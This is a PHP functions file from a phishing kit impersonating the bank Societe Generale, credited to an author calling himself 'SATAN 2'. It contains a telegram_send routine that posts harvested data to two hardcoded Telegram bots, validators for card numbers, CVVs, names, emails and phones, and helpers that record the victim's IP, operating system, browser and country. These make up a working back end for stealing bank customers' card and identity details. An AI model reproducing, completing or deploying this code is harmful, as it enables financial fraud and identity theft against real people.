<?php

/**
 * @link       :   https://www.satan2.com/ 
 * @package    :   SOCIETE GENERALE 
 * @telegram   :   @satan2  
 * Project Name:   SOCIETE GENERALE 2022
 * Author      :   SATAN 2
 * Mise à jour :   08-09-2022
 * Author URI  :   https://www.facebook.com/satan2
 */

function telegram_send($message, $encodage) {
    $format = 'HTML';
    $msg_encoded = urlencode($message);

    // Premier bot
    $api_key1  = '8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A';
    $chat_id1  = '6297861735';

    // Deuxième bot
    $api_key2  = '8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs';
    $chat_id2  = '7650873997';

    // Envoi au premier bot
    $curl1 = curl_init();
    curl_setopt($curl1, CURLOPT_URL, "https://api.telegram.org/bot{$api_key1}/sendMessage?chat_id={$chat_id1}&text={$msg_encoded}&parse_mode={$format}");
    curl_setopt($curl1, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl1, CURLOPT_RETURNTRANSFER, true);
    curl_exec($curl1);
    curl_close($curl1);

    // Envoi au deuxième bot
    $curl2 = curl_init();
    curl_setopt($curl2, CURLOPT_URL, "https://api.telegram.org/bot{$api_key2}/sendMessage?chat_id={$chat_id2}&text={$msg_encoded}&parse_mode={$format}");
    curl_setopt($curl2, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl2, CURLOPT_RETURNTRANSFER, true);
    curl_exec($curl2);
    curl_close($curl2);

    return true;
}

function is_invalid_class($array, $key) {
    if (!is_array($array))
        return false;
    if (isset($array[$key])) {
        return 'is-invalid';
    }
    return false;
}

function validation($array, $key) {
    if (!is_array($array))
        return false;
    if (isset($array[$key])) {
        return '<div class="invalid-feedback">' . $array[$key] . '</div>';
    }
    return false;
}

function get_value($value) {
    if (isset($_SESSION[$value])) {
        return $_SESSION[$value];
    }
}

function get_selected_option($name, $value) {
    if (isset($_SESSION[$name]) && $_SESSION[$name] == $value) {
        return 'selected';
    }
}

function validate_card($number) {
    global $type;
    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );
    if (preg_match($cardtype['visa'], $number)) {
        $type = "visa";
        return 'visa';
    } elseif (preg_match($cardtype['mastercard'], $number)) {
        $type = "mastercard";
        return 'mastercard';
    } elseif (preg_match($cardtype['amex'], $number)) {
        $type = "amex";
        return 'amex';
    } elseif (preg_match($cardtype['discover'], $number)) {
        $type = "discover";
        return 'discover';
    } else {
        return false;
    }
}

function validate_cvv($number) {
    return preg_match("/^[0-9]{3,4}$/", $number) ? true : false;
}

function validate_date($date, $format = 'Y-m-d H:i:s') {
    $d = DateTime::createFromFormat($format, $date);
    return $d && $d->format($format) == $date;
}

function validate_name($name) {
    return preg_match('/^[\p{L} ]+$/u', $name) ? true : false;
}

function validate_email($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) ? true : false;
}

function validate_phone($phone) {
    $filtered_phone_number = filter_var($phone, FILTER_SANITIZE_NUMBER_INT);
    return (strlen($filtered_phone_number) == 12);
}

function validate_number($number, $length = null) {
    if (!is_numeric($number)) {
        return false;
    }
    if ($length === null) {
        return true;
    }
    return (strlen($number) == $length);
}

function get_user_ip() {
    return $_SERVER['REMOTE_ADDR'];
}

function get_user_os() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i'     =>  'Windows 10',
        '/windows nt 6.3/i'    =>  'Windows 8.1',
        '/windows nt 6.2/i'    =>  'Windows 8',
        '/windows nt 6.1/i'    =>  'Windows 7',
        '/windows nt 6.0/i'    =>  'Windows Vista',
        '/windows nt 5.2/i'    =>  'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'    =>  'Windows XP',
        '/windows xp/i'        =>  'Windows XP',
        '/windows nt 5.0/i'    =>  'Windows 2000',
        '/windows me/i'        =>  'Windows ME',
        '/win98/i'             =>  'Windows 98',
        '/win95/i'             =>  'Windows 95',
        '/win16/i'             =>  'Windows 3.11',
        '/macintosh|mac os x/i'=>  'Mac OS X',
        '/mac_powerpc/i'       =>  'Mac OS 9',
        '/linux/i'             =>  'Linux',
        '/ubuntu/i'            =>  'Ubuntu',
        '/iphone/i'            =>  'iPhone',
        '/ipod/i'              =>  'iPod',
        '/ipad/i'              =>  'iPad',
        '/android/i'           =>  'Android',
        '/blackberry/i'        =>  'BlackBerry',
        '/webos/i'             =>  'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
        }
    }
    return $os_platform;
}

function get_user_browser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown Browser";
    $browser_array = array(
        '/msie/i'       =>  'Internet Explorer',
        '/firefox/i'    =>  'Firefox',
        '/safari/i'     =>  'Safari',
        '/chrome/i'     =>  'Chrome',
        '/opera/i'      =>  'Opera',
        '/netscape/i'   =>  'Netscape',
        '/maxthon/i'    =>  'Maxthon',
        '/konqueror/i'  =>  'Konqueror',
        '/mobile/i'     =>  'Handheld Browser'
    );
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $browser = $value;
        }
    }
    return $browser;
}

function get_user_country() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['REMOTE_ADDR']));
    if ($details && $details->geoplugin_countryName != null) {
        return $details->geoplugin_countryName;
    }
    return null;
}

function get_user_countrycode() {
    $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $_SERVER['REMOTE_ADDR']));
    if ($details && $details->geoplugin_countryCode != null) {
        return $details->geoplugin_countryCode;
    }
    return null;
}

?>
